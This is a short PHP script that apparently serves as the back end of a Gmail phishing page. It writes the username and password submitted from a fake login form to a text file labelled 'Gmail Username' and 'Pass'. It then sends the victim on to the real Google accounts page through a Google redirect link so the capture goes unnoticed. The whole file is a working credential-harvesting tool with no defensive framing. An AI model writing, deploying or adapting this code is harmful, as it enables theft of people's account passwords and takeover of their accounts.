<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjH9Yv5_OD8AhUwVaQEHZ2bAOgQFnoECA8QAQ&url=https%3A%2F%2Faccounts.google.com%2F&usg=AOvVaw33vbO0yD5ue-bN0tdaehNC');
exit();
?>
